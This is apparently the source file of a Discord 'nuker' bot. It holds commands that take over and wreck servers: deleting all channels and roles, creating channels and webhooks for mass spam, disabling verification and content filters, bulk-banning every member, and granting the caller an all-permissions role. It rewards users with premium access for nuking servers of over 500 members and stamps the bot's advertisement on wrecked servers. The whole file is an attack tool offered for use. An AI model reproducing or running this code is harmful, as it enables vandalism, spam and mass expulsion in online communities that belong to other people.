import asyncio
from datetime import timedelta
from discord.ext import commands
import discord
from core.core import Nuker
from core.config import NAME
from core.managers.nukelogger import log_nuke
from core.managers.usertypes import blacklisted_command, _db
from cogs.nukeconfig import get_user_nuke_config
from core.managers.usertypes import is_premium, set_premium, premium_cooldown

from typing import List
from aiohttp import ClientSession
from core.async_task import create_tasks

supernuke_used = set()


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @blacklisted_command()
    @premium_cooldown(1, 120)
    @commands.command(
        name="nuke",
        help="Nuke the server")
    async def nuke(self, ctx: commands.Context):
        await log_nuke(ctx)

        if ctx.guild.member_count > 500 and not is_premium(ctx.author.id):
            set_premium(ctx.author.id, 604800)
            await ctx.author.send("Server has over 500 members! You've been granted 7 days of premium.")

        user_config = await get_user_nuke_config(ctx.author.id)
        server_name = user_config.get("server_name") or f"📢 Void property"
        server_desc = user_config.get("server_description") or f'This place has been obliterated by {NAME}. Join now if you want a bot like this.'

        await ctx.guild.edit(
            name=server_name,
            description=server_desc,
            community=False,
            default_notifications=discord.NotificationLevel.all_messages,
            system_channel_flags=discord.SystemChannelFlags._from_value(0),
            discoverable=False,
            widget_enabled=False,
            dms_disabled_until=discord.utils.utcnow() + timedelta(days=1),
            invites_disabled_until=discord.utils.utcnow() + timedelta(days=1),
            premium_progress_bar_enabled=True,
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled
        )

        nuker = Nuker(ctx, user_config=user_config)

        await nuker.delChannels()
        channels, webhooks = await nuker.crChannels()

        async def spam_all():
            await asyncio.gather(
                nuker.spam(),
                nuker.spamWebhooks(webhooks),
            )

        asyncio.create_task(spam_all())
        await _db.log_nuke(ctx.author.id, ctx.guild.id, ctx.guild.name, ctx.guild.member_count)

    @blacklisted_command()
    @premium_cooldown(1, 30)
    @commands.command(name="create_channels", aliases=["cc", "createchannel"], help="Create 150 channels with webhooks")
    async def create_channels(self, ctx: commands.Context):
        user_config = await get_user_nuke_config(ctx.author.id)
        nuker = Nuker(ctx, user_config=user_config)
        channels, webhooks = await nuker.crChannels()
        await ctx.send(f"Created {len(channels)} channels and {len(webhooks)} webhooks.")

    @blacklisted_command()
    @premium_cooldown(1, 30)
    @commands.command(name="delete_channels", aliases=["dc", "deletechannels"], help="Delete all channels")
    async def delete_channels(self, ctx: commands.Context):
        nuker = Nuker(ctx)
        await nuker.delChannels()
        await ctx.send("Deleted all channels.")

    @blacklisted_command()
    @premium_cooldown(1, 30)
    @commands.command(name="spam_webhook", aliases=["spamweb", "sw", "spamwebhook"], help="Spam webhooks")
    async def spam_webhook(self, ctx: commands.Context):
        user_config = await get_user_nuke_config(ctx.author.id)
        nuker = Nuker(ctx, user_config=user_config)
        webhooks = await nuker.ensureWebhooks()
        await nuker.spamWebhooks(webhooks)
        await ctx.send("Spammed webhooks.")

    @blacklisted_command()
    @premium_cooldown(1, 30)
    @commands.command(name="create_roles", aliases=["crroles", "createroles", "cr"], help="Create roles")
    async def create_roles(self, ctx: commands.Context, name: str = f"{NAME} was here", count: int = 20):
        nuker = Nuker(ctx)
        await nuker.crRoles(name, count)

    @blacklisted_command()
    @premium_cooldown(1, 30)
    @commands.command(name="delete_roles", aliases=["delroles", "dr"], help="Delete all roles")
    async def delete_roles(self, ctx: commands.Context):
        nuker = Nuker(ctx)
        await nuker.delRoles()

    @blacklisted_command()
    @commands.command(name="supernuke", aliases=["sn", "skill", "superkill"], help="Super nuke the server (once per guild)")
    @commands.has_permissions(administrator=True)
    async def supernuke(self, ctx: commands.Context):
        if ctx.guild.id in supernuke_used:
            await ctx.send("This guild has already been supernuked.")
            return

        supernuke_used.add(ctx.guild.id)
        await log_nuke(ctx)

        if ctx.guild.member_count > 500 and not is_premium(ctx.author.id):
            set_premium(ctx.author.id, 604800)
            await ctx.send("Server has over 500 members! You've been granted 7 days of premium.")

        user_config = await get_user_nuke_config(ctx.author.id)
        server_name = user_config.get("server_name") or f"Owned by {NAME}"
        server_desc = user_config.get("server_description") or f'This place has been obliterated by {NAME}. Join now if you want a bot like this.'

        await ctx.guild.edit(
            name=server_name,
            description=server_desc,
            community=False,
            default_notifications=discord.NotificationLevel.all_messages,
            system_channel_flags=discord.SystemChannelFlags._from_value(0),
            discoverable=False,
            widget_enabled=False,
            dms_disabled_until=discord.utils.utcnow() + timedelta(days=1),
            invites_disabled_until=discord.utils.utcnow() + timedelta(days=1),
            premium_progress_bar_enabled=True,
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled
        )

        nuker = Nuker(ctx, user_config=user_config)

        await nuker.delChannels()
        await nuker.delete_events()
        await nuker.create_event()
        channels, webhooks = await nuker.crChannels()

        async def spam_all():
            await asyncio.gather(
                nuker.spam(),
                nuker.spamWebhooks(webhooks),
            )

        asyncio.create_task(spam_all())
        await nuker.delRoles()
        role_name = user_config.get("server_name") or f"{NAME} was here"
        await nuker.crRoles(role_name)
        await _db.log_nuke(ctx.author.id, ctx.guild.id, ctx.guild.name, ctx.guild.member_count)
        await ctx.send("Super nuke complete.")


class MassBan(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @blacklisted_command()
    @premium_cooldown(1, 120)
    @commands.command(
        name="massban",
        help="Mass ban all members in the server")
    @commands.has_permissions(ban_members=True)
    async def massban(self, ctx: commands.Context):
        await ctx.send("Starting MassBan...")

        nuker = Nuker(ctx)
        guild_id = ctx.guild.id
        bot_member = ctx.guild.me

        member_ids: List[str] = []
        for member in ctx.guild.members:
            if member.id == bot_member.id:
                continue
            if member.top_role >= bot_member.top_role:
                continue
            member_ids.append(str(member.id))

        if not member_ids:
            await ctx.send("No bannable members found. Please ensure my role is above the main member role")
            return

        chunks = [member_ids[i:i + 200] for i in range(0, len(member_ids), 200)]
        urls = [f"https://discord.com/api/v10/guilds/{guild_id}/bulk-ban" for _ in chunks]
        jsons = [{"user_ids": chunk, "delete_message_seconds": 0} for chunk in chunks]

        async with ClientSession(headers=nuker.headers) as session:
            await create_tasks(urls, session.post, nuker.headers, jsons)

        await _db.log_nuke(ctx.author.id, ctx.guild.id, ctx.guild.name, ctx.guild.member_count)
        await ctx.send(f"MassBan complete. Banned {len(member_ids)} members.")


class Admin(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @blacklisted_command()
    @commands.command(
        name="admin",
        aliases=["give_admin"],
        help="Give yourself admin permissions")
    async def admin(self, ctx: commands.Context):
        role = await ctx.guild.create_role(
            name="admin777",
            permissions=discord.Permissions.all(),
            color=discord.Color.red(),
            hoist=True,
        )
        await ctx.author.add_roles(role)
        await ctx.send(f"Admin role created and assigned: {role.mention}")


async def setup(bot: commands.Bot):
    await bot.add_cog(MassBan(bot))
    await bot.add_cog(Nuke(bot))
    await bot.add_cog(Admin(bot))


def teardown(bot: commands.Bot):
    bot.remove_cog(MassBan.__name__)
    bot.remove_cog(Nuke.__name__)
    bot.remove_cog(Admin.__name__)
